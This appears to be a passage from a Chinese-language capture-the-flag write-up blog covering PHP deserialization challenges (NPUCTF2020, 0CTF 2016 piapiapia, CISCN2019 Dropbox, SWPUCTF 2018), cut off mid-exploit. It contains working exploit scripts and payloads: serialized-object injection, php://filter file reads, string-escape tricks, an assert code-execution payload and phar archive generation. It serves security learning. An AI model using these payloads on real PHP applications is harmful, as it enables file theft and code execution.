    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先看到最后，需要传参str，然后转为字符串，传入is_valid函数检查ascii码是否是位于32~125，然后反序列。</p>
<p>然后看destruct函数，它会判断op属性值是不是”2”，是”2”就改为”1”，注意这里是强比较，然后触发process()函数。</p>
<p>发现在read函数里有file_get_contents读文件的操作，那我们的目标就是利用这个函数读取flag.php文件。</p>
<p>看到process函数，要触发read函数，就要使op的值为”2”，这里是弱比较。</p>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里有两个细节：</p>
<ol>
<li><p>op的值是2，数据类型是int，和“2”进行强比较结果为假，与“2”弱比较结果为真，完美绕过。</p>
</li>
<li><p>protected改为了public，这里是因为is_valid函数会进行检查，而%00的ascii码是0，通过不了检查，所以不能存在空字符串。</p>
</li>
</ol>
<hr>
<h4 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h4><p>查看源代码发现&#x2F;time.php?source文件，访问它。</p>
<p>是一道反序列化的题，先看destruct函数，最终会输出b(a)，所以让变量b为system，变量a为phpinfo，这里system被禁用，用&#x3D;&#x3D;assert&#x3D;&#x3D;代替，序列化后payload：</p>
<p>?data&#x3D;O:8:”HelloPhp”:2:{s:1:”a”;s:9:”phpinfo()”;s:1:”b”;s:6:”assert”;}</p>
<p>ctrl+f查找flag</p>
<hr>
<h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><p>学到的知识：extract对session数组的覆盖</p>
<p>&#x3D;&#x3D;反序列化逃逸&#x3D;&#x3D;的方法</p>
<p>参考链接：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/12813992.html">安洵杯 2019]easy_serialize_php - LLeaves - 博客园 (cnblogs.com)</a></p>
<p>首先代码审计，在phpinfo找到d0g3_f1ag.php文件</p>
<p>d0g3_f1ag.php—-base64加密—-&gt;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;</p>
<p>&#x2F;d0g3_fllllllag——base64加密—–&gt;L2QwZzNfZmxsbGxsbGFn</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">#方法一</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
    <span class="token comment">#结果 a:1:&#123;s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;，这里就造成img不成为一个键，也就无法进行加密</span>
    <span class="token comment">#过滤掉flag有</span>
    <span class="token comment">#a:1:&#123;s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;</span>
    <span class="token comment">#使得绕过;s:51:""到达下一个封号，这时img成功逃逸出来</span>

    <span class="token comment">#方法二</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagphp'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">';s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
   
    <span class="token comment">#方法三</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:2:"aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p>&#x3D;&#x3D;反序列化字符串逃逸&#x3D;&#x3D;</p>
<p><a target="_blank" rel="noopener" href="http://www.zip下载源码,访问regiest.php注册账号,然后登录,然后代码审计./">www.zip下载源码，访问regiest.php注册账号，然后登录，然后代码审计。</a></p>
<p>打开后，开始审计，反正我是不会 。其实做的题多了，也就能发现，来来回回也就那几个函数。我们可以在config.php里看见flag，那我们只要读取config.php文件即可，然后后在profile.php里看见file_get_contents()函数。</p>
<p>原来的序列化：</p>
<pre class="line-numbers language-none"><code class="language-none">a:4:&#123;s:5:“phone”;s:11:“11111111111”;s:5:“email”;s:11:“1a2s@qq.com”;s:8:“nickname”;s:3:“123”;s:5:“photo”;s:39:“upload&#x2F;f3b94e88bd1bd325af6f62828c8785dd”;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以利用反序列化漏洞，在nickname（因为nickname是最后一个）里加上<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> ，<code>&quot;;&#125;</code>后面的都不会反序列化了，这样photo对应的值也就是config.php了。</p>
<p>在update.php里，</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>正则匹配控制nickname的值，直接利用&#x3D;&#x3D;数组&#x3D;&#x3D;绕过。</p>
<p>另外，我们知道<code>where</code>等字符会被<code>hacker</code>替换，从而增加一个字符，而<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> 长34个字符，那我们传递34个where使后面的photo键值对逃逸出去。</p>
<p>payload：</p>
<pre class="line-numbers language-none"><code class="language-none">nickname改为nickname[]

s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h4><p>&#x3D;&#x3D;phar反序列化&#x3D;&#x3D;</p>
<p>注册后登录，随便上传一个文件，然后点击下载，抓包，更改filename的值为..&#x2F;..&#x2F;index.php，成功读取源代码，存在任意文件读取</p>
<p>index.php、class.php、download.php、delete.php等</p>
<p>index.php：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用了FileList类里面的Name和Size方法。</p>
<p>但是class.php里面的FlieList类没有那两个方法，从而触发call函数，call函数的意思是调用File类的对应方法。</p>
<p>在File类里面有一个close方法，里面可以读文件，那我们就是要想办法触发close方法。</p>
<p>又看到User类里有一个close方法，如果<code>db=new FileList()</code>就会调用close方法了。</p>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$name</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? >'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将生成的phar文件上传，注意要抓包改mime，然后删除，在filename写phar:&#x2F;&#x2F;test.jpg</p>
<hr>
<h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>&#x3D;&#x3D;phar反序列化&#x3D;&#x3D;</p>
<p>在file.php有一个明显的参数file，应该可以任意文件读取，file&#x3D;file.php，下载源代码。</p>
<p>file.php:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//建立对象</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
  <span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> <span class="token comment">//赋值</span>
  <span class="token variable">$show</span><span class="token operator">-></span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//调用函数</span>
<span class="token punctuation">&#125;</span> 
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>重要的是class.php</p>
<p>pop链：<br>C1e4r类创建时，会将传入的参数最终赋值给C1e4r-&gt;test并输出。</p>
<p>show类将传入的参数file在<code>__toString</code>的时候复制给content并返回，<code>__toString</code>方法由C1e4r类中的<code>__destruct</code>触发。</p>
<p>Test类中，<code>__get</code>魔术方法会在调用不存在的属性时触发，Test类中不存在source属性。</p>
<p><code>C1e4r::__destruct()-&gt;Show::__toString-&gt;Test::__get()</code></p>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'var/www/html/f1ag.php'</span><span class="token punctuation">;</span><span class="token comment">//要访问的文件。</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//触发__toString</span>
